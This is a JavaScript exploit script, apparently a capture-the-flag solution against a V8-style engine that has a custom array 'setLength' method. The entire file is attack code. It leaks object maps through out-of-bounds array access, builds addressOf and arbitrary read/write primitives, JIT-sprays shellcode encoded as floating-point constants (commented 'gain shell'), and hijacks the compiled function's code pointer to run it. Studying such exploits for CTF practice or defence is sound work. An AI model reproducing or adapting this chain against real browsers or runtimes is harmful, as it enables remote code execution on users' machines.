var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);

function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}

function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}

function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}

function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}

function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}

function u32_to_f32(val){
    u32[0] = val;
    return f32[0];
}

// function stop(){
//     %SystemBreak();
// }

// function p(arg){
//     %DebugPrint(arg);
// }

function spin(){
    while(1){};
}

function hex(str){
    return str.toString(16).padStart(16,0);
}

function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}

// // gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}

const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}

for(let i = 0; i< 10000; i++){
    shellcode();
}

// js_heap_defragment();
var tag = 1;
var array = new Array(0x1000).fill(1.1)
var rw_array = new Array(0x1000).fill(2.2);
var obj = {array,rw_array};

array.setLength(0x10000);


// p(array);
// p(rw_array);
// p(obj);


var double_map_addr = u64_to_u32_lo(f64_to_u64(array[0x1000]));
var double_prototype_addr = u64_to_u32_hi(f64_to_u64(array[0x1000]));

// // 方法1
// var obj_map_addr = u64_to_u32_lo(f64_to_u64(array[0x2805]));
// var obj_prototype_addr = u64_to_u32_hi(f64_to_u64(array[0x2805]));

// 方法2
rw_array.setLength(0x10000);
var obj_map_addr = u64_to_u32_lo(f64_to_u64(rw_array[0x1000]));
var obj_prototype_addr = u64_to_u32_hi(f64_to_u64(rw_array[0x1000]));

logg("double_array_map",double_map_addr)
logg("double_prototype_addr",double_prototype_addr)

logg("obj_map_addr",obj_map_addr)
logg("obj_prototype_addr",obj_prototype_addr)


function addressOf(object){
    rw_array[0x1000] = lh_u32_to_f64(obj_map_addr,obj_prototype_addr);
    obj[0] = object;
    rw_array[0x1000] = lh_u32_to_f64(double_map_addr,double_prototype_addr);
    return u64_to_u32_lo(f64_to_u64(obj[0]));
}

function AAR(addr){
    rw_array[0x1000] = lh_u32_to_f64(double_map_addr,double_prototype_addr);
    rw_array[0x1001] = lh_u32_to_f64((addr - 8) | tag,0x20000);
    // rw_array[0x1000] = lh_u32_to_f64(obj_map_addr,obj_prototype_addr);
    return f64_to_u64(obj[0]);
}

function AAW(addr,val){
    rw_array[0x1000] = lh_u32_to_f64(double_map_addr,double_prototype_addr);
    rw_array[0x1001] = lh_u32_to_f64((addr - 8) | tag,0x20000);
    // let lo = Number(BigInt(val) & 0xffffffffn);
    // let hi = Number((BigInt(val) >> 32n) & 0xffffffffn);
    // logg("lo",lo);
    // logg("hi",hi);
    // obj[0] = lh_u32_to_f64(lo,hi);
    obj[0] = u64_to_f64(val);
}

// p(shellcode);
var shellcode_addr = addressOf(shellcode);
var code_addr = AAR(shellcode_addr+0xc) & 0xffffffffn;
var ins_base = AAR(Number(code_addr)-1+0x14);

logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
logg("rop_addr",ins_base+0x6bn);

AAW(Number(code_addr)-1+0x14,BigInt(ins_base+0x6bn))

// stop();
shellcode();




// spin();